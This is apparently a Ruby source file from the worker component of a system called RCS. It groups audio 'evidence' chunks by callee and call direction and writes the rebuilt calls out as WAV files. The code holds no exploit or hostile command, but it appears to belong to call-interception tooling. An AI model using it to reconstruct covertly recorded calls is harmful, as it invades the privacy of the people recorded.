module RCS
module Worker

require 'ffi'
require 'rcs-common/trace'
require 'rcs-worker/speex'
require 'rcs-worker/wave'

require 'digest/md5'

class Channel
  include Tracer
  attr_reader :sample_rate, :start_time, :stop_time, :wav_data, :status
  
  def initialize(evidence)
    @name = evidence.channel.to_s
    @sample_rate = evidence.sample_rate
    @start_time = evidence.start_time
    @stop_time = @start_time
    @wav_data = String.new
    @status = :open
    trace :debug, "Creating new channel #{self.id}"
  end
  
  def id
    "#{@name}:#{@sample_rate}:#{@start_time}:#{@stop_time}:#{@status.to_s}"
  end
  
  def self.other_than channel
    channel == :incoming ? :outgoing : :incoming
  end
  
  def close!
    @status = :closed
    trace :debug, "Closing channel #{self.id}"
  end
  
  def closed?
    @status == :closed
  end

  def accept?(evidence)
    return false if closed?
    time_gap = evidence.start_time.to_f - @stop_time.to_f
    trace :debug, "evidence with a time gap of #{time_gap} with channel stop time."
    return false if time_gap >= 5.0
    return true
  end
  
  def feed(evidence)
    if evidence.end_call?
      self.close!
      return
    end

    @stop_time = evidence.stop_time
    @wav_data += evidence.wav
  end
  
  def size
    @wav_data.size
  end
  
  def to_s
    self.id
  end
  
  def to_wavfile (filename = '')
    name = "#{Digest::MD5.hexdigest("#{@start_time}")}_#{@name}.wav"
    File.open(name, 'wb') do |f|
      data_header = Wave.data_header @wav_data.size
      chunk_header = Wave.chunk_header 1, @sample_rate
      main_header = Wave.main_header @wav_data.size + data_header.size + chunk_header.size
      f.write main_header
      f.write chunk_header
      f.write data_header
      f.write @wav_data
    end
  end
end

class Call
  include Tracer
  attr_writer :start_time
  
  def initialize(evidence)
    @callee = evidence.callee
    @start_time = evidence.start_time
    @channels = {}
    create_channel evidence
    trace :info, "new call for #{@callee} #{@start_time} on channel #{evidence.channel.to_s.upcase}"
  end
  
  def id
    "#{@callee}:#{@start_time}"
  end
  
  def accept?(evidence)
    # we accept evidence only if relative channel accept it
    channel = get_channel evidence
    return channel.accept? evidence unless channel.nil?
    trace :debug, "evidence is not being accepted by call #{id}"
    return false
  end
  
  def get_channel(evidence)
    return @channels[evidence.channel] || create_channel(evidence)
  end
  
  def create_channel(evidence)
    # update start time of call if new channel have start time before current one
    channel = Channel.new evidence
    @channels[evidence.channel] = channel
    channel
  end
  
  def closed?
    closed_channels = @channels.select {|k,v| v.closed? unless v.nil? }
    trace :debug, "Closed channels: #{closed_channels.size}, total channels: #{@channels.size}"
    return closed_channels.size == @channels.size
  end
  
  def feed(evidence)
    # if evidence is empty or call is closed, refuse feeding
    return false if evidence.wav.size == 0
    return false if closed?
    
    # get the correct channel for the evidence
    channel = get_channel(evidence)
    trace :debug, "feeding #{evidence.wav.size} bytes at #{evidence.start_time}:#{evidence.stop_time} to #{channel.id}"
    
    # check if channel accepts evidence
    unless channel.accept? evidence
      trace :debug, "channel refused evidence"
      return false
    end
    
    channel.feed evidence
    return true
  end
  
  def to_s
    self.id
  end
  
  def to_wavfile
    @channels.keys.each do |k|
      @channels[k].to_wavfile "#{self.object_id}_#{k.to_s}.wav"
    end
  end
  
end

class AudioProcessor
  include Tracer
  require 'pp'
  
  def initialize
    @calls = []
  end
  
  def get_call(evidence)
    open_calls = @calls.select {|c| c.accept? evidence and not c.closed? }
    return open_calls.first unless open_calls.empty?

    # no valid call was found, we need to create a new one
    call = create_call(evidence)
    return call
  end
  
  def create_call(evidence)
    call = Call.new evidence
    @calls << call
    trace :debug, "issuing a new call for #{evidence.callee}:#{evidence.start_time}"
    call
  end
  
  def feed(evidence)
    # if callee is unknown or evidence is empty, evidence is invalid, ignore it
    return if evidence.callee.size == 0 or evidence.wav.size == 0
    
    call = get_call evidence
    call.feed evidence
  end
  
  def to_s
    string = ''
    @calls.each do |c|
      string += "#{c}\n"
    end
    return string
  end
  
  def to_wavfile
    @calls.each do |c|
      c.to_wavfile
    end
  end
end

end # Audio::
end # RCS::
